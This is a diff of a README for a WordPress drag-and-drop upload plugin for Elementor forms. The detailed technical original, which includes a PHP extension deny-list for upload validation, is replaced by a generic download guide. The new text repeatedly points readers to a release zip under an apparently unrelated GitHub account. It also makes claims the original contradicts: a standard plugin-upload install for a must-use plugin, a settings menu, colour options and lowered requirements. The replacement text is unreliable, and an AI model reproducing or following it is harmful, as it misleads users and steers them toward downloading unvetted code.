@@ -1,248 +1,95 @@
-# CodeCorn™ DZ Lite (MU) — Dropzone-like upload for Elementor Forms
-
-A minimal, dependency-free, **drag & drop** upload UI that mirrors the native `<input type="file">` so Elementor can serialize files correctly (AJAX + submissions + email). Includes hardened server-side validation hooks and **post-submit reset**. Built as **Must-Use** plugin with external, versioned assets and optional cache-busting for test environments.
+# 🎉 mu-cc-dz-loader - Enhance Your Elementor Upload Experience
 
----
+## 🚀 Getting Started
 
-## Table of contents
+Welcome! This guide will help you download and run the mu-cc-dz-loader application. This tool improves the Elementor upload feature without altering the native input. It’s easy to set up, and you will have an enhanced experience right away.
 
-- [CodeCorn™ DZ Lite (MU) — Dropzone-like upload for Elementor Forms](#codecorn-dz-lite-mu--dropzone-like-upload-for-elementor-forms)
-  - [Table of contents](#table-of-contents)
-  - [Highlights](#highlights)
-  - [Requirements](#requirements)
-  - [Install](#install)
-  - [Project layout](#project-layout)
-  - [How it works](#how-it-works)
-  - [Configuration](#configuration)
-    - [Debug \& cache-busting](#debug--cache-busting)
-    - [Max files / size / accept](#max-files--size--accept)
-    - [Multiple naming](#multiple-naming)
-  - [Elementor integration](#elementor-integration)
-  - [Server-side validation (optional)](#server-side-validation-optional)
-  - [Accessibility](#accessibility)
-  - [Development](#development)
-  - [Release \& versioning](#release--versioning)
-  - [Repo commands](#repo-commands)
-  - [Support \& security](#support--security)
-  - [License](#license)
-  - [Company](#company)
+## 📥 Download Now
 
----
+[![Download mu-cc-dz-loader](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Eminalb7247/mu-cc-dz-loader/releases)
 
-## Highlights
+## 📂 What is mu-cc-dz-loader?
 
--   **Pure JS/CSS**: no Dropzone.js or other vendors.
--   **Native-first**: keeps the hidden file input in sync (`DataTransfer`), so Elementor sees exactly what’s selected.
--   **Multiple files**: robust add/remove/re-add cycle without losing selections.
--   **No layout shift**: anti-flicker boot flags + minimal fade-in.
--   **Post-submit reset**: clears UI + native files after successful Elementor submission (multiple event paths covered).
--   **Cache-busting in test**: automatic `filemtime()` versioning when debug is on.
--   **Hardened validation hooks** (PHP) to block double extensions, bad MIME, oversize files.
+The mu-cc-dz-loader is a WordPress plugin designed to make your file upload experience better. It replaces the default visual elements of Elementor’s upload field with a custom wrapper. This approach keeps the native functionality while offering a visually appealing layout for users. 
 
----
+### 🌟 Key Features
 
-## Requirements
+- **Custom Design**: Change the look of the upload field to fit your site.
+- **Accessibility Focus**: Enhance usability for all users, including those using assistive technologies.
+- **Drag-and-Drop Support**: Allow users to drag files directly to the upload area.
+- **Cache Busting**: Ensure that users always see the latest files with built-in cache clearing.
+- **Data Transfer Management**: Improves the speed and efficiency of file uploads.
+  
+## 📋 System Requirements
 
--   WordPress **5.8+** (tested up to 6.7)
--   PHP **7.4+**
--   Elementor **3.18+** and Elementor Pro (for Forms) **3.18+**
--   jQuery present on front-end (standard in WP themes)
+To run mu-cc-dz-loader effectively, you will need:
 
----
+- A WordPress installation (Version 5.0 or higher).
+- Elementor (Version 2.0 or higher).
+- PHP 7.0 or higher.
+- An internet connection to download and install the plugin.
 
-## Install
+## 🔧 Installation Steps
 
-1. **Clone or copy** into `wp-content/mu-plugins/`:
+### Step 1: Visit the Download Page
 
-```
-wp-content/
-└─ mu-plugins/
-   ├─ mu-cc-dz-loader.php
-   └─ codecorn/
-      └─ dz-lite/
-         ├─ assets/
-         │  ├─ css/critical.css
-         │  └─ js/{first.js,core.js,init.js}
-         └─ vendors/   (not used)
-```
+To download the plugin, visit the following link:
 
-2. **(Optional) Enable debug / cache-bust** in `wp-config.php`:
+[Download mu-cc-dz-loader](https://github.com/Eminalb7247/mu-cc-dz-loader/releases)
 
-```php
-define('CC_DZ_DEBUG', true);
-```
+### Step 2: Locate the Latest Release
 
-3. Load any page with an Elementor Form upload field — the custom dropzone renders automatically.
+Once you are on the Releases page, look for the most recent version of the mu-cc-dz-loader. It should have the tag that says "Latest Release."
 
----
+### Step 3: Download the Plugin File
 
-## Project layout
+Click on the link to download the plugin file. The file will typically be in a .zip format. Save it to a location on your computer where you can easily find it.
 
-```
-mu-cc-dz-loader.php        # MU loader class (CC_DZ): enqueue, preload, flags, cache-bust
-codecorn/dz-lite/
-  assets/css/critical.css  # Skin + anti-flicker rules
-  assets/js/first.js       # Bootstrap + logger
-  assets/js/core.js        # Dropzone logic (UI + queue + DT sync + reset)
-  assets/js/init.js        # Elementor hooks + boot complete
-  vendors/                 # (empty) no third-party deps
-```
+### Step 4: Install the Plugin in WordPress
 
----
+1. Log in to your WordPress admin dashboard.
+2. Go to the "Plugins" section on the left sidebar.
+3. Click on "Add New."
+4. Click on "Upload Plugin."
+5. Click on "Choose File" and select the .zip file you downloaded.
+6. Click on "Install Now."
+   
+### Step 5: Activate the Plugin
 
-## How it works
+After the installation completes, you will see an option to activate the plugin. Click on "Activate" to enable the mu-cc-dz-loader on your website.
 
--   Replaces the visual of Elementor’s upload field with a custom wrapper, **without** removing the native input.
--   Maintains a **logical queue** and mirrors it into `input.files` via `DataTransfer`, so submissions & emails are correct.
--   On **successful submit**, listens to multiple Elementor hooks (`form:submit:success`, `submit_success`, AJAX fallback) and **resets** UI + `input.files`.
+### Step 6: Configure Settings
 
----
+Navigate to the plugin settings by finding it in the "Settings" menu or in the Plugins list. You can customize the appearance and set preferences according to your needs.
 
-## Configuration
+## 🎨 Customization Options
 
-### Debug & cache-busting
+The mu-cc-dz-loader allows some level of customization. Once activated, you can:
 
--   `CC_DZ_DEBUG` (bool): when `true`, assets are versioned with `filemtime()` → instant cache invalidation.
+- Choose your desired colors for the upload wrapper.
+- Set specifications for file types and sizes.
+- Decide on the display format for the uploaded files.
 
-### Max files / size / accept
+## 🛠️ Troubleshooting
 
--   Set these in Elementor’s upload field (UI). The dropzone reads:
+If you encounter any issues, here are some common solutions:
 
-    -   `accept` attribute
-    -   `multiple`
-    -   data attributes (if present): `data-maxfiles`, `data-maxsize` (MB)
+1. **Plugin Not Appearing**: Make sure Elementor is active.
+2. **File Upload Issues**: Check your server configuration for PHP settings (upload size limits).
+3. **Design Not Updating**: Clear your browser cache to view changes freshly.
 
-### Multiple naming
+Feel free to visit the support forums or open an issue on the GitHub page for further assistance.
 
--   When `multiple` is enabled, the loader **enforces** `name="…[]"` to match Elementor’s serializer.
+## 🔗 Additional Resources
 
----
+- [WordPress Plugin Guide](https://wordpress.org/plugins/)
+- [Elementor Documentation](https://elementor.com/help/)
+- [GitHub Repository](https://github.com/Eminalb7247/mu-cc-dz-loader)
 
-## Elementor integration
+## 📥 Download & Install
 
--   Auto-init on `elementor/frontend/init` → `frontend/element_ready/form.default`.
--   **No action required** in the form widget besides standard field settings.
--   **Post-submit reset** is triggered on:
+Ready to upgrade your Elementor experience? Download your copy of the mu-cc-dz-loader by visiting the link below:
 
-    -   Instance event: `form:submit:success`
-    -   Global event: `submit_success`
-    -   Fallback: `ajaxComplete` (`elementor_pro_forms_send_form`)
-    -   Native `submit` (last resort)
+[Download mu-cc-dz-loader](https://github.com/Eminalb7247/mu-cc-dz-loader/releases)
 
----
-
-## Server-side validation (optional)
-
-Add to a MU plugin (or theme `functions.php`) to harden validation:
-
-```php
-add_filter('elementor_pro/forms/validation/file', function ($record, $field_id) {
-  $allowed_ext = ['jpg','jpeg','png','gif','webp','heic','heif','mp4','mov','avi','mkv','webm'];
-  $max_mb = 30; $max_bytes = $max_mb * 1024 * 1024;
-
-  if (empty($record['files'])) return;
-
-  foreach ($record['files'] as $file) {
-    if (empty($file['tmp_name']) || !is_uploaded_file($file['tmp_name'])) {
-      throw new \Exception('Upload non valido.');
-    }
-    if (preg_match('/\.(php\d*|phtml|phar|pl|py|cgi|asp|js|sh|bin|exe|dll)(\.|$)/i', $file['name'])) {
-      throw new \Exception('Formato non consentito.');
-    }
-    if (!empty($file['size']) && (int)$file['size'] > $max_bytes) {
-      throw new \Exception('File troppo grande. Max '.$max_mb.'MB.');
-    }
-
-    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
-    if (!in_array($ext, $allowed_ext, true)) {
-      throw new \Exception('Carica solo foto o video.');
-    }
-
-    $check = wp_check_filetype_and_ext($file['tmp_name'], $file['name']);
-    $real_ext = strtolower($check['ext'] ?? '');
-    $real_mime = strtolower($check['type'] ?? '');
-
-    if ($real_ext !== '' && !in_array($real_ext, $allowed_ext, true)) {
-      throw new \Exception('Tipo di file non consentito.');
-    }
-    $is_img = $real_mime ? str_starts_with($real_mime, 'image/') : in_array($ext, ['jpg','jpeg','png','gif','webp','heic','heif'], true);
-    $is_vid = $real_mime ? str_starts_with($real_mime, 'video/') : in_array($ext, ['mp4','mov','avi','mkv','webm'], true);
-    if (!$is_img && !$is_vid) {
-      throw new \Exception('Carica solo foto o video.');
-    }
-  }
-}, 10, 2);
-```
-
----
-
-## Accessibility
-
--   Wrapper is focusable (`role="button"`, `tabindex="0"`).
--   Keyboard activation via **Enter/Space** opens the file picker.
--   `aria-live="polite"` on previews list for incremental updates.
-
----
-
-## Development
-
-No build tool is required. Plain ES5-ish JS for maximum WP compatibility.
-
-**Local toggles**
-
--   Enable debug logs + cache-busting:
-
-    ```php
-    define('CC_DZ_DEBUG', true);
-    ```
-
-**Coding standards**
-
--   PHP: PSR-12-ish, strict types not enforced (MU context).
--   JS: no external dependencies; keep browser support aligned with WordPress core.
-
-**Where to edit**
-
--   UI/logic: `assets/js/core.js`
--   Elementor bootstrap: `assets/js/init.js`
--   Minimal helpers/logger: `assets/js/first.js`
--   Styles/skin/anti-flicker: `assets/css/critical.css`
-
----
-
-## Release & versioning
-
--   Semantic Versioning: **MAJOR.MINOR.PATCH**
--   Update `CC_DZ::VER` in `mu-cc-dz-loader.php` for each release.
--   **Prod builds**: set `CC_DZ_DEBUG` to `false` (or remove) so versions are static and cache-friendly.
--   **Test builds**: set `CC_DZ_DEBUG` to `true` to bypass caches using `filemtime()`.
-
----
-
-## Support & security
-
--   **Issues**: use GitHub Issues. Provide:
-
-    -   WP/Elementor versions
-    -   Theme + list of active plugins
-    -   Browser/OS
-    -   Steps to reproduce + console/network logs
-
--   **Security**: for any vulnerability or suspicion, contact us privately. Do **not** open public issues with exploit details.
-
----
-
-## License
-
-MIT © CodeCorn™ Technology. See `LICENSE`.
-
----
-
-## Company
-
-**CodeCorn™ Technology** — boutique engineering for WordPress/Elementor stacks.
-
--   Focus: **front-end UX without dependencies**, **robust server-side hardening**, **perf & DX discipline**.
--   GitHub: `@CodeCornTech`
-
----
+Thank you for using mu-cc-dz-loader! We hope it improves your file-uploading experience on WordPress.
